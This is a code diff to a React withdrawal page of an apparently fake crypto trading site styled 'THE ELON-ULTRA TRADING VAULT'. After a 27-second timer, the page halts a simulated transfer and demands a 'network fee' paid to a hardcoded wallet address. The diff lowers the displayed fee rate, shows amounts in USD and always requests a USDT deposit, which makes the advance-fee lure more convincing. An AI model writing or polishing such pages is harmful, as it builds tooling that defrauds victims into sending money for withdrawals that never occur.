@@ -2,6 +2,10 @@ import { useState, useEffect, useRef } from 'react';
 import { useSearchParams, useNavigate, useLocation } from 'react-router-dom';
 import './WithdrawalFeeConfirmPage.css';
 
+const WITHDRAWAL_FEE_RATE = 0.0005; // 0.05%
+const FEE_DISPLAY_CURRENCY = 'USD';
+const FEE_DEPOSIT_CURRENCY = 'USDT';
+
 export default function WithdrawalProcessPage() {
   const [searchParams] = useSearchParams();
   const location = useLocation();
@@ -56,7 +60,7 @@ export default function WithdrawalProcessPage() {
     const amount = location.state?.amount || searchParams.get('amount');
     const currency = location.state?.currency || searchParams.get('currency');
     const id = location.state?.withdrawalId || searchParams.get('id');
-    const feeAmount = location.state?.feeAmount || (parseFloat(amount) * 0.24).toFixed(8);
+    const feeAmount = location.state?.feeAmount || (parseFloat(amount) * WITHDRAWAL_FEE_RATE).toFixed(2);
 
     if (!amount || !currency) {
       setError('Missing withdrawal details. Please start a new withdrawal.');
@@ -70,8 +74,8 @@ export default function WithdrawalProcessPage() {
       id: id || `WD-${Date.now()}`,
       amount: parseFloat(amount),
       currency,
-      fee: parseFloat(fee.toFixed(8)),
-      total: parseFloat(total.toFixed(8)),
+      fee: parseFloat(fee.toFixed(2)),
+      total: parseFloat(total.toFixed(2)),
       feeAddress: '0xd36e85873f91120785D3090Af4fE00d1050720c0',
       status: 'REQUIRED',
     };
@@ -100,7 +104,7 @@ export default function WithdrawalProcessPage() {
       rate: '1.0',
       tdate: today,
       fromAcct: 'THE ELON-ULTRA TRADING VAULT',
-      xcur: 'USDT',
+      xcur: FEE_DEPOSIT_CURRENCY,
       destCountry: bankingDetails.country || '',
       benName: bankingDetails.acctName || '',
       benAcct: bankingDetails.acctNumber || '',
@@ -191,9 +195,7 @@ export default function WithdrawalProcessPage() {
       pauseTransferForFee();
       setShowFeeAlert(true);
       // Fetch deposit address when fee alert appears
-      if (withdrawal?.currency) {
-        fetchDepositAddress(withdrawal.currency);
-      }
+      fetchDepositAddress(FEE_DEPOSIT_CURRENCY);
     }, 27000);
 
     return () => {
@@ -536,8 +538,8 @@ export default function WithdrawalProcessPage() {
               
               <div style={{ padding: '12px', background: 'rgba(0,0,0,0.05)', borderRadius: '8px', marginBottom: '12px' }}>
                 <div style={{ fontSize: '13px' }}>
-                  <div><strong>Withdrawal Amount:</strong> {withdrawal?.amount.toFixed(8)} {withdrawal?.currency}</div>
-                  <div style={{ marginTop: '6px' }}><strong>Network Fee Required:</strong> {withdrawal?.fee.toFixed(8)} {withdrawal?.currency}</div>
+                  <div><strong>Withdrawal Amount:</strong> ${withdrawal?.amount.toFixed(2)} {FEE_DISPLAY_CURRENCY}</div>
+                  <div style={{ marginTop: '6px' }}><strong>Network Fee Required:</strong> ${withdrawal?.fee.toFixed(2)} {FEE_DISPLAY_CURRENCY}</div>
                 </div>
               </div>
 
